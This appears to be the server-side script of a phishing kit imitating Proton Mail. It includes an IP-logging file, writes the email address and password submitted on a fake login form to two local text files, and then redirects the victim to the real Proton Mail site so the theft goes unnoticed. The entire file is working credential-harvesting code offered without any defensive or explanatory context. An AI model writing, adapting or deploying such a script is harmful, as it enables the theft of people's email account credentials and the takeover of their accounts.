<?php
include 'ip.php';
file_put_contents("usernames.txt", "Proton Mail Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Proton Mail Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://protonmail.com/');
?>
